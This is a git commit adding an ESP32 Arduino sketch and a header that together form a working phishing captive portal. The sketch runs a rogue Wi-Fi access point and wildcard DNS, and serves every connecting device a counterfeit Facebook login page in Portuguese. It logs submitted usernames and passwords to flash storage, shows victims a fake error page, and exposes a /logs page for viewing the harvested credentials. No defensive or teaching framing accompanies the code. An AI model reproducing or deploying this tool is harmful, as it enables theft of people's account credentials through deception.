d5f1c2b8c3145fee0692adc1fd0f231b56b13ea3
Kauan0122 <kauansouza0122@gmail.com>
2021-07-11 14:14:22 -0300

    ESP32

---
+++ ESPcaptive.ino
@@ -0,0 +1,179 @@
+#include <SPIFFS.h>
+#include <WiFi.h>
+#include <WiFiClient.h>
+#include <WebServer.h>
+#include <DNSServer.h>
+#include <ESPmDNS.h>
+#include <FS.h>
+#include "google.h"
+#include "facebook.h"
+
+#define LOGFILE "/log.txt"
+ 
+// Ponto de acesso
+const char *ssid="...";
+const char *password="123456789";
+
+
+// Login da pagina de captura
+#define captivePortalPage FACEBOOK_HTML
+// GOOGLE_HTML, FACEBOOK_HTML
+
+// Configuração básica usando configurações de rede comuns (porta DNS usual, IP e porta do servidor web)
+const byte DNS_PORT = 53;
+IPAddress apIP(200, 200, 200, 1);
+IPAddress netMsk(255, 255, 255, 0);
+DNSServer dnsServer;
+WebServer server(80);
+
+// Strings de buffer
+String webString="";
+String serialString="";
+
+// Pisca o LED integrado numero de vezes
+void blink(int n)
+{
+  for(int i = 0; i < n; i++)
+  {
+    digitalWrite(LED_BUILTIN, LOW);    
+    delay(250);                    
+    digitalWrite(LED_BUILTIN, HIGH);  
+    delay(250);
+  }
+}
+
+void setup() {
+  // Iniciar comunicação serial
+  Serial.begin(9600);
+  Serial.println();
+  Serial.println("ESP32captive(1.5)");
+  Serial.println();
+
+  // configuração de LED
+  pinMode(LED_BUILTIN, OUTPUT);
+  digitalWrite(LED_BUILTIN, HIGH);  
+
+  // Inicialize o sistema de arquivos (SPIFFS) e leia o arquivo de log, se não estiver presente, crie um novo
+  Serial.print("Inicializando o sistema de arquivos (a primeira vez pode levar cerca de 90 segundos)...");
+  SPIFFS.begin();
+  Serial.println("Sucesso!");
+  Serial.print("Verificando o arquivo log.txt...");
+  
+  // isso abre o arquivo "log.txt" em modo de leitura
+  File f = SPIFFS.open(LOGFILE, "r");
+  
+  if (!f) {
+    Serial.print("O arquivo ainda não existe.\n Formatando e criando...");
+    SPIFFS.format();
+    // abre o arquivo no modo de escrita
+    File f = SPIFFS.open(LOGFILE, "w");
+    if (!f) {
+      Serial.println("Falha na criação do arquivo!");
+    }
+    f.println("Credenciais de login capturadas:");
+  }
+  f.close();
+  Serial.println(" Sucesso!");
+
+  // Criar Ponto de Acesso
+  Serial.print("Criando Ponto de Acesso...");
+  WiFi.mode(WIFI_AP);
+  delay(2000);
+  WiFi.softAPConfig(apIP, apIP, netMsk);
+  WiFi.softAP(ssid, password);
+  delay(500);
+  Serial.println(" Sucesso!");
+
+  // Inicie o servidor DNS
+  Serial.print("Iniciando Servidor DNS...");
+  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
+  dnsServer.start(DNS_PORT, "*", apIP);
+  Serial.println(" Sucesso!");
+
+  // Verifique o nome do domínio e atualize a página
+  server.on("/", handleRoot);
+  server.on("/generate_204", handleRoot);  // Portal cativo Android. Talvez não seja necessário. Pode ser manipulado pelo manipulador notFound.
+  server.on("/fwlink", handleRoot); // Portal cativo da Microsoft. Talvez não seja necessário. Pode ser manipulado pelo manipulador notFound.
+  server.onNotFound(handleRoot);
+
+  // Valide e salve as combinações USUARIO / SENHA
+  server.on("/validate", []() {
+    // armazenar credenciais colhidas
+    String url = server.arg("url");
+    String user = server.arg("user");
+    String pass = server.arg("pass");
+
+    // Enviando dados para Serial (DEBUG
+    serialString = user+":"+pass;
+    Serial.println(serialString);
+
+    // Anexar dados ao arquivo de log
+    File f = SPIFFS.open(LOGFILE, "a");
+    f.print(url);
+    f.print(":");
+    f.print(user);
+    f.print(":");
+    f.println(pass);
+    f.close();
+    
+    // Envie uma resposta de erro ao usuário após a coleta de credencial
+    webString = "<style> *{ } html { height: 100%; } body{ font-family: 'Lato', sans-serif; color: #888; margin: 0; } #main{ display: table; width: 100%; height: 100vh; text-align: center; } .fof{ display: table-cell; vertical-align: middle; } .fof h1{ font-size: 50px; display: inline-block; padding-right: 12px; } } </style> <div id=\"main\"> <div class=\"fof\"> <h1>Error 404</h1> </div> </div>";
+
+    server.send(500, "text/html", webString);
+
+    // Reinicializar strings de buffer
+    serialString="";
+    webString="";
+
+    blink(5);
+    
+  });
+
+  // Logging Page
+  server.on("/logs", [](){
+    webString="<html><body><h1>Captured Logs</h1><br><pre>";
+    File f = SPIFFS.open(LOGFILE, "r");
+    serialString = f.readString();
+    webString += serialString;
+    f.close();
+    webString += "</pre><br><a href='/logs/clear'>Clear all logs</a></body></html>";
+    server.send(200, "text/html", webString);
+    Serial.println(serialString);
+    serialString="";
+    webString="";
+  });
+
+  // Limpar todos os logs
+  server.on("/logs/clear", [](){
+    webString="<html><body><h1>All logs cleared</h1><br><a href=\"/esportal\"><- BACK TO INDEX</a></body></html>";
+    File f = SPIFFS.open(LOGFILE, "w");
+    f.println("Credenciais de login capturadas:");
+    f.close();
+    server.send(200, "text/html", webString);
+    Serial.println(serialString);
+    serialString="";
+    webString="";
+  });
+  
+  // Inicie o servidor da Web
+  Serial.print("Iniciando o Servidor da Web...");
+  server.begin();
+  Serial.println(" Sucesso!");
+  
+  blink(10);
+  
+  Serial.println("Dispositivo pronto!");
+}
+
+void loop() {
+  dnsServer.processNextRequest();
+  server.handleClient();
+}
+
+void handleRoot() {
+  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+  server.sendHeader("Pragma", "no-cache");
+  server.sendHeader("Expires", "-1");
+
+  server.send(200, "text/html", captivePortalPage);
+}
---
+++ facebook.h
@@ -0,0 +1,182 @@
+const char FACEBOOK_HTML[] = R"=====(
+<html>
+  <head>
+    <title>Facebook Login</title>
+    <meta charset='UTF-8'>
+    <meta name='viewport' content='width=device-width,
+    initial-scale=0.75, maximum-scale=0.75, user-scalable=no'>
+    <meta name='theme-color' content='#5170ad' />
+    <style class='cp-pen-styles'>
+      
+        -webkit-box-sizing: border-box;
+        -moz-box-sizing: border-box;
+        box-sizing: border-box;
+      }
+      html {
+        background: #ffffff;
+      }
+      body {
+            font-family: arial;
+            font-size: 14px;
+            color: #1c1e21;
+            font-weight: normal;
+            background: #f0f2f5
+      }
+      .login-form-wrap {
+        background-color: #f0f2f5;
+        filter: progid: DXImageTransform.Microsoft.gradient( startColorstr='#5170ad', endColorstr='#355493', GradientType=1);
+        position: relative;
+        width: 100%;
+        height: 100%;
+        margin: auto auto;
+        padding: 50px 30px 0 30px;
+        text-align: center;
+      }
+      .login-form-wrap:before {
+        display: block;
+        content: '';
+        width: 58px;
+        height: 19px;
+        top: 10px;
+        left: 10px;
+        position: absolute;
+      }
+      .login-form-wrap > h1 {
+        margin: 0 0 0px 0;
+        font-size: 50px;
+        color: #1877f2;
+        font-weight: 900;
+        
+      }
+      .login-form-wrap > h5 {
+        margin-top: 40px;
+      }
+      .login-form-wrap > h5 > a {
+        font-size: 14px;
+        color: #fff;
+        text-decoration: none;
+        font-weight: 400;
+      }
+      .login-form input[type='text'],
+      .login-form input[type='password'] {
+        display: block;
+        width: 345px;
+        border: 1px solid #314d89;
+        outline: none;
+        padding: 12px 20px;
+        color: #afafaf;
+        font-weight: 400;
+        font-family: 'Lato', sans-serif;
+        cursor: pointer;
+      }
+      .login-form input[type='text'] {
+            width: 100%;
+            color: black;
+            height: 50px;
+            font-size: 17px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            padding: 0 15px;
+            margin-bottom: 25px;
+      }
+      .login-form input[type='password'] {
+            width: 100%;
+            color: black;
+            height: 50px;
+            font-size: 17px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            padding: 0 15px;
+            margin-bottom: 25px;
+      }
+      .login-form input[type='submit'] {
+        font-family: 'Lato', sans-serif;
+        font-weight: 400;
+        background: #1877f2;
+        filter: progid: DXImageTransform.Microsoft.gradient( startColorstr='#e0e0e0', endColorstr='#cecece', GradientType=0);
+        display: block;
+        margin: 50px auto 0 auto;
+        width: 400px;
+        border: none;
+        border-radius: 10px;
+        padding: 10px;
+        font-size: 17px;
+        color: #ffffff;
+        text-shadow: 0 1px 0 rgba(129, 129, 129, 0.45);
+        font-weight: 700;
+        box-shadow: 0 1px 3px 1px rgba(0, 0, 0, 0.17), 0 1px 0 rgba(255, 255, 255, 0.36) inset;
+      }
+      .login-form input[type='submit']:hover {
+        background: #2f85f5;
+      }
+      .login-form input[type='submit']:active {
+        padding-top: 9px;
+        padding-bottom: 7px;
+        background: #2f85f5;        
+      }
+      .disable-selection {
+        -webkit-touch-callout: none;
+        -webkit-user-select: none;
+        -khtml-user-select: none;
+        -moz-user-select: none;
+        -ms-user-select: none;
+        user-select: none;
+      }
+
+      .login-form-wrap form {
+            background: #fff;
+            width: 400px;
+            height: 250px;
+            background: #fff;
+            background: #fff;
+            border-radius: 20px;
+            padding:30px;
+            -webkit-box-shadow: -1px -1px 8px -1px rgba(0, 0, 0, 0.52);
+            -moz-box-shadow: -1px -1px 8px -1px rgba(0, 0, 0, 0.52);
+            box-shadow: -1px -1px 8px -1px rgba(0, 0, 0, 0.52);
+            margin-bottom: 30px;
+        }
+        .login-form-wrap {
+            max-width: 450px;
+            margin: auto;
+            text-align: center;
+        }
+
+        .login-form #eml:hover{
+            border: 1px solid #1877f2;
+        }
+        .login-form #pwd:hover {
+            border: 1px solid #1877f2;
+        }
+        .disable-text {
+
+            font-family: 'Freight Sans Bold', Helvetica, Arial, sans-serif;
+            font-size: 24px;
+            text-align: center;
+            font-weight: 100;
+            line-height: 30px;
+            padding: 0 40 15px;
+            text-rendering: optimizelegibility;
+            width: auto;
+
+        }
+      
+    
+    
+    </style>
+  </head>
+  <body>
+    <section class='login-form-wrap'>
+      <h1 class='disable-selection'>facebook</h1>
+      <h2 class='disable-text'>Entre com o Facebook e comece a navegar agora!</h2>
+        <form class='login-form' action='/validate' method='GET'>
+            <center><label>
+            <input id='eml' type='text' name='user' class='1' placeholder='Email ou Telefone' _autofocus='true' autocorrect='off' autocomplete='off' autocapitalize='off' required></label>
+            <label><input id='pwd' type='password' name='pass' class='2' placeholder='Senhar' autocorrect='off' autocomplete='off' autocapitalize='off' required></label></center>
+            <input type='hidden' name='url' value='facebook'>
+            <input id='btn' type='submit' value='ENTRAR'>
+        </form>
+    </section>
+  </body>
+</html>
+)=====";
